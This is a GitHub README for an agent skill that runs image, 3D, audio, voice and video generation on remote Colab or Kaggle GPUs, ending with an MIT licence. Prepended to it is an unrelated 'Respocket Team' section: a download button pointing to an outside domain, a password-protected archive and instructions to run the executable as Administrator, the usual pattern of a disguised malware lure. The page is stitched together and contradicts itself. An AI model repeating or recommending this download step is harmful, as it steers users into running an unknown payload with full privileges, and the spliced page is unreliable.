<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# local-generative-colab-skill

A skill that drives a heavy **generative-media pipeline** from a local Linux machine while
all computation runs on a **remote Google Colab GPU** (NVIDIA T4, ~16 GB) via the Colab CLI.

It covers five coupled branches:

- **Visual reconstruction** — reconstruct high-quality imagery from source frames using a
  top-tier generative model, conditioned on the source (not a plain pixel upscaler).
- **Editable asset extraction** — decompose a scene into maximally editable transparent 2D
  assets using SAM 2.1 Large for segmentation and BiRefNet for refinement.
- **3D asset generation** — turn genuinely volumetric elements into editable 3D assets with
  Hunyuan3D 2.1.
- **Audio reconstruction / generation** — music, SFX and ambience for the reconstructed scene.
- **Voice** — speech synthesis and voice cloning with **Qwen3-TTS**, and word-level
  transcription with **Qwen3-ASR + Qwen3-ForcedAligner**.
- **Video generation & regeneration** — generate or regenerate motion with **LTX-2.5**
  (Lightricks' open-weights audio-video world model): T2V/I2V/A2V, native multishot and
  synchronised audio, plus Retake, extend, inpainting/outpainting, IC-LoRA transforms,
  upscale/restore and SDR→HDR.

## Layout

```
SKILL.md                                     Skill entry point (frontmatter + workflow)
README.md                                    This file
INSTALL.md                                   Copy-paste installation prompt (plain Markdown)
references/
  master-specification.md                    System spec: domains, architecture, routers, pipelines
  prompt-engine.md                           Task-specific, model-aware prompts + negative prompts
  model-discovery.md                         Research-and-select the best model per task
  architecture-and-cli.md                    Architecture, remote-GPU rules, Colab CLI, project dirs
  remote-compute.md                          Kaggle (primary) vs Colab (fallback): specs, priority, storage
  persistence-protocol.md                    3 tiers (local light truth / Kaggle heavy truth / sessions nothing)
  resource-discipline.md                     One task per session; multi-session scaling; no wasted runtime
  watchdog.md                                Self-healing background-job watchdog (pull/log/re-push/alert)
  quota-and-accounts.md                      Monitor account limits; escalate account switches to the user
  example-project-summary.md                 Worked example of the end-of-project summary format
  visual-reconstruction.md                   Objective, image-generation quality stage, models
  visual-understanding-and-segmentation.md   Understanding, editability, SAM 2.1, BiRefNet
  asset-extraction-and-generation.md         Classification, extraction vs generation, text, logos
  3d-generation.md                           Hunyuan3D 2.1 3D asset generation
  video-generation.md                        LTX-2.5 video generation & regeneration
  video-analysis.md                          MOSS-VL video understanding + finalisation gate
  audio.md                                   Audio: ACE-Step 1.5, Stable Audio Open 1.5
  voice.md                                   Voice: Qwen3-TTS + word-level ASR / alignment
  model-selection.md                         Use case → expert model map (video, image, 3D, audio)
docs/
  generation-times.html                      Local video generation-time chart (model × GPU)
LICENSE                                      MIT
```

## Core idea

The local Linux machine is **only the controller** and the **source of truth**. Every task
— heavy and light: model inference, downloads, packaging, editing, assembling — runs on a
**remote cloud backend: Kaggle (primary, CPU and GPU) or Colab (fallback)**, chosen per task.
Both remote filesystems are **ephemeral scratch**; outputs are pulled back to the local home
directory. The controller inspects the installed CLI (`colab` or `kaggle`), adapts to its
actual syntax, verifies the remote GPU, and builds / executes / monitors / debugs / resumes /
packages / returns the whole project without asking the user to do anything by hand.

Priority order throughout: **Quality > Fidelity > Editability > Speed**.

**No fixed model set.** For every task the agent researches the current best specialist
model — instead of defaulting to one all-rounder — and verifies quality, hardware fit and
licence before locking it in. `references/model-discovery.md` is the protocol;
`references/model-selection.md` is the current cached answer.

**Never waste remote runtime.** Keep **one task per session**, and release each VM (unload the
model, stop the session) as soon as its task's outputs are back on local. **Scale
horizontally** — run many sessions across both Colab and Kaggle at once, one task each, to
finish faster. Quotas are per account, so if a backend runs out the agent **tells you** to
switch accounts. The local machine only saves files, runs the controller scripts and collects
outputs — no local work at all.

**Mandatory — switch each session off when its work is done.** Free is not unlimited: an idle
session wastes runtime and quota. Be efficient, but never compromise on quality.

## Using it

Point your agent at `SKILL.md` and follow the workflow, pulling detail from `references/` as
each stage needs it. The skill is written to be executed end to end against a live Colab
runtime, not read as a tutorial.

## Extras

- `INSTALL.md` — the **installation prompt in plain Markdown** (copy the code block and
  paste it into your agent). This is the easiest format to copy.
- `docs/generation-times.html` — a self-contained chart of local video-generation times
  across GPUs (T4, RTX 3060/4080/3090/4090/5090, A100, H100) for the leading open video
  models. Open it in a browser; it adapts to light and dark mode.
- `docs/install-prompt.html` — a tap-to-copy page with the skill installation prompt to
  paste into an agent.

## Note on source material

The core instructions were assembled from a master production brief. The brief was truncated
after section 28 (the 3D-generation branch) and did not include the detailed audio-pipeline
sections referenced in its architecture diagram. Those gaps have since been filled from
public sources: `references/3d-generation.md` now carries the full Hunyuan3D 2.1 module, and
`references/audio.md` covers the audio branch (ACE-Step 1.5, Stable Audio Open 1.5).


---

MIT License

Copyright (c) 2026 adittaya

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
